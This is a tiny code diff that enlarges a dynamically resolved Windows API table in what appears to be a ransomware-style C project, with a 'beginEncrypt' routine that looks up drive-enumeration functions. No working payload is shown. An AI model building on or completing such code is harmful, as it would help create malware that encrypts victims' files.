@@ -4,7 +4,7 @@
 #include "File.h"
 #include "PE.h"
 #include <stdio.h>
-extern FARPROC APIArray[54];
+extern FARPROC APIArray[55];
 
 int beginEncrypt() {
 	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
